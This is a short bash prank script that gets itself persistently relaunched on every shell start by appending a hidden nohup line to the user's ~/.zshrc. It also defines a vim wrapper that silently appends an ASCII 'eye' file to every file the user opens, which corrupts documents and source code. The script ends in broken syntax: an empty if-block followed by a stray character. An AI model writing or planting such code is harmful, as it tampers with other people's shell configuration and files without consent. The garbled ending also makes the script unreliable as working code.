#!/bin/bash

if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/vimeye.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/vimeye.sh > /dev/null 2>&1 &
EOF
fi

SCRIPT_DIR="/sgoinfre/goinfre/Perso/mochamsa/troll/vimeye.sh"
EYE="/sgoinfre/goinfre/Perso/mochamsa/troll/eye"
ZSHRC="$HOME/.zshrc"

if [[ ! -f "$EYE" ]]; then
    exit 1
fi

ALIAS_FUNCTION="
vim() {
    local file=\"\$1\"
    
    if [[ -z \"\$file\" ]]; then
        command vim
        return
    fi
    
    if [[ ! -f \"\$file\" ]]; then
        touch \"\$file\"
    fi
    
    if ! grep -Fxq \"\$(head -n 1 '$EYE')\" \"\$file\"; then
        cat '$EYE' >> \"\$file\"
    fi
    
    command vim \"\$file\"
}
"

if ! grep -q "vim()" "$ZSHRC" 2>/dev/null; then
fi
e
